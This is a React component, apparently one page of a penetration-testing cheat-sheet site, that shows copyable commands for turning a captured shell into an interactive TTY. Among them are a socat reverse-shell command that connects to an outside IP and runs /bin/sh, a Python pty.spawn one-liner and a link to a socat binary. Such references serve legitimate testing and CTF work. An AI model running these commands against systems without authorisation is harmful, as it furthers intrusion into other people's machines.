import React from 'react';
import { Typography, Divider } from 'antd';
// i18n
import '../../i18n';
import { useTranslation } from 'react-i18next';
//

const { Title, Paragraph, Text, Link } = Typography;

export default function TTY() {
    const { t } = useTranslation();
    const py_tty_command = `$(which python python2 python3 | head -n 1) -c 'import pty;pty.spawn("/bin/bash")'`;
    const socat_tty_command = `socat TCP:192.168.163.129:9090 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`;
    return (
        <div>
            <div>
                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                    {t('tty_title')}
                </Title>
                <Paragraph style={{ margin: 15 }}>
                    {t('tty_desc')}
                </Paragraph>
                <Divider />
                <div
                    style={{
                        padding: 6,
                    }}
                >
                    <Title level={4} style={{margin: 5}}>{t('tty_solution1')}</Title>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                python3 -c 'import pty;pty.spawn("/bin/bash")'
                            </Text>
                        </pre>
                    </Paragraph>
                    Or
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                {py_tty_command}
                            </Text>
                        </pre>
                    </Paragraph>
                </div>

                <div
                    style={{
                        padding: 6,
                    }}
                >
                    <Title level={4} style={{margin: 5}}>{t('tty_solution2')}</Title>
                    <Paragraph>- {t('tty_solution2_getbin')}: <Link href='https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat' target='_blank'>Download Socat</Link></Paragraph>
                    <Paragraph>- {t('tty_solution2_getcmd')}: <Link href='./RevShell#name=socat+%232+%28TTY%29' target='_blank'>Socat Reverse Shell</Link></Paragraph>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                {socat_tty_command}
                            </Text>
                        </pre>
                    </Paragraph>
                </div>

                <Divider />
                <div
                    style={{
                        padding: 6,
                    }}>
                    <Title level={4} style={{margin: 5}}>{t('tty_autocomp')}</Title>
                    <Paragraph>
                        <pre>
                            <Text copyable>
                                export TERM=xterm
                            </Text>
                        </pre>
                    </Paragraph>
                    <Paragraph>
                        <strong>{t('tty_background')}</strong>
                        <pre>
                            <Text>
                                Press 'Ctrl + Z'
                            </Text>
                        </pre>
                        {t('tty_background1')}
                        <pre>
                            <Text copyable>
                                {`stty raw -echo; fg\nstty rows 38 columns 116`}
                            </Text>
                        </pre>
                        {t('tty_background2')}
                    </Paragraph>
                </div>
            </div>
        </div>
    );
}
